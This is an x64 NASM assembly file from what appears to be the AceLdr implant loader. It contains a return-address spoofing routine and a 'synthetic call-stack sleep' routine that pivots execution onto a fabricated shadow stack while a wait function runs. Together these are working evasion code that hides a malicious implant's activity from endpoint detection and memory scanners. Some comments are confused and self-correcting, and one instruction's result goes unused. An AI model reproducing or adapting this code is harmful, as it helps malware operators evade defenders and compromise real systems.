[BITS 64]

DEFAULT REL

GLOBAL Spoof
GLOBAL SynthStackSleep

[SECTION .text]

; ---- Existing AceLdr return-address spoof ----
Spoof:
    pop    r11
    add    rsp, 8
    mov    rax, [rsp + 24]
    mov    r10, [rax]
    mov    [rsp], r10
    mov    r10, [rax + 8]
    mov    [rax + 8], r11
    mov    [rax + 16], rbx
    lea    rbx, [fixup]
    mov    [rax], rbx
    mov    rbx, rax
    jmp    r10

fixup:
    sub    rsp, 16
    mov    rcx, rbx
    mov    rbx, [rcx + 16]
    jmp    QWORD [rcx + 8]

; ---- ARC-02: Synthetic call-stack sleep ----
;
; DWORD SynthStackSleep(
;     PVOID            WaitFunc,     // rcx
;     HANDLE           hObject,      // rdx
;     DWORD            dwTimeout,    // r8
;     BOOL             bAlertable,   // r9
;     PSYNTH_STACK_CTX Ctx           // [rsp+0x28]
; );
;
; SYNTH_STACK_CTX offsets:
;   +0x00  OriginalRsp
;   +0x08  OriginalRbp
;   +0x10  ShadowBase        (unused here)
;   +0x18  ShadowSize        (unused here)
;   +0x20  ShadowRsp
;   +0x28  ShadowRbp
;
; Pivots RSP/RBP to the shadow stack, calls WaitFunc(hObject, dwTimeout, bAlertable),
; then restores the original RSP/RBP and returns the DWORD result.

SynthStackSleep:
    ; Prologue: save non-volatile registers we clobber
    push   rbx
    push   rdi
    push   rsi
    push   r12
    push   r13

    ; Load ctx pointer (5th arg at [rsp + 0x28] + 5 pushes * 8 = [rsp + 0x50])
    mov    r12, [rsp + 0x50]

    ; Save WaitFunc and args in non-volatile registers
    mov    r13, rcx             ; WaitFunc
    mov    rdi, rdx             ; hObject
    mov    esi, r8d             ; dwTimeout (DWORD)
    mov    ebx, r9d             ; bAlertable (BOOL)

    ; Save original RSP and RBP into the context struct
    lea    rax, [rsp + 0x50 + 0x08] ; original RSP before our pushes + retaddr
    ; Actually, save the RSP that the caller had (before call instruction pushed retaddr)
    ; At entry: [rsp] = return addr, then we pushed 5 regs.
    ; Original caller RSP = rsp + 5*8 + 8 (retaddr) = rsp + 0x30
    ; But we need to restore to the state that lets us pop and ret correctly.
    ; Save current rsp (after our pushes) — we'll restore to this exact point.
    mov    [r12 + 0x00], rsp    ; OriginalRsp
    mov    [r12 + 0x08], rbp    ; OriginalRbp

    ; Pivot to shadow stack
    mov    rsp, [r12 + 0x20]    ; ShadowRsp
    mov    rbp, [r12 + 0x28]    ; ShadowRbp

    ; Set up args for WaitForSingleObjectEx(hObject, dwTimeout, bAlertable)
    mov    rcx, rdi             ; hObject
    mov    edx, esi             ; dwTimeout
    mov    r8d, ebx             ; bAlertable

    ; Allocate shadow home space (32 bytes) required by Win64 ABI
    sub    rsp, 0x20
    call   r13                  ; WaitFunc(hObject, dwTimeout, bAlertable)
    add    rsp, 0x20

    ; Save return value
    mov    r13d, eax

    ; Restore original RSP/RBP from saved context
    mov    rsp, [r12 + 0x00]    ; OriginalRsp
    mov    rbp, [r12 + 0x08]    ; OriginalRbp

    ; Return value
    mov    eax, r13d

    ; Epilogue: restore non-volatile registers
    pop    r13
    pop    r12
    pop    rsi
    pop    rdi
    pop    rbx
    ret